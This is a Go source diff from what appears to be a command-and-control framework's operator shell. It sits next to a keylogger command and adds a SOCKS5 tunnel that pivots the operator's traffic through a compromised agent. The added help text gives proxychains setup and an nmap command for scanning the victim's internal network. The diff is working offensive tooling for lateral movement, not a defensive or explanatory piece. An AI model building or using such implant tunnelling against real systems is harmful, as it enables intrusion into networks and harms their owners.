@@ -1424,11 +1424,58 @@ func (sh *Shell) cmdKeylog(args []string) {
 func (sh *Shell) cmdSocks(args []string) {
 	if len(args) == 0 {
 		Info("SOCKS5 proxy commands:")
-		fmt.Printf("    %ssocks start [bind_addr]%s    Start SOCKS5 (default: 127.0.0.1:1080)\n", colorCyan, colorReset)
-		fmt.Printf("    %ssocks stop%s                 Stop SOCKS5 proxy\n", colorCyan, colorReset)
+		fmt.Printf("    %ssocks start [port]%s     Start C2-tunneled SOCKS5 on your machine\n", colorCyan, colorReset)
+		fmt.Printf("    %ssocks stop%s              Stop SOCKS5 tunnel\n", colorCyan, colorReset)
+		fmt.Printf("    %ssocks list%s              Show active tunnels\n", colorCyan, colorReset)
+		fmt.Println()
+		Info("After starting, configure proxychains:")
+		fmt.Printf("    echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf\n")
+		fmt.Printf("    proxychains nmap -sT -Pn <internal_network>\n")
 		return
 	}
-	sh.queueTask(protocol.TaskSocks, args, nil)
+
+	switch args[0] {
+	case "start":
+		if sh.activeAgent == nil {
+			Error("No agent selected. Use: interact <agent>")
+			return
+		}
+		bind := "127.0.0.1:1080"
+		if len(args) > 1 {
+			bind = "127.0.0.1:" + args[1]
+		}
+		msg, err := sh.server.TunnelMgr.StartSOCKSTunnel(sh.server, sh.activeAgent.ID, sh.activeAgent.Name, bind)
+		if err != nil {
+			Error("SOCKS tunnel failed: %v", err)
+		} else {
+			Success("%s", msg)
+		}
+	case "stop":
+		if sh.activeAgent == nil {
+			Error("No agent selected")
+			return
+		}
+		if err := sh.server.TunnelMgr.StopSOCKSTunnel(sh.activeAgent.ID); err != nil {
+			Error("%v", err)
+		} else {
+			Success("SOCKS tunnel stopped")
+		}
+	case "list":
+		tunnels := sh.server.TunnelMgr.ListTunnels()
+		if len(tunnels) == 0 {
+			Warn("No active tunnels")
+			return
+		}
+		t := NewTable("Agent", "Bind Address", "Connections")
+		for _, tun := range tunnels {
+			t.AddRow(tun["agent"], tun["bind"], tun["connections"])
+		}
+		fmt.Println()
+		t.Render()
+	default:
+		// Fall back to agent-side socks (legacy)
+		sh.queueTask(protocol.TaskSocks, args, nil)
+	}
 }
 
 func (sh *Shell) cmdPortFwd(args []string) {
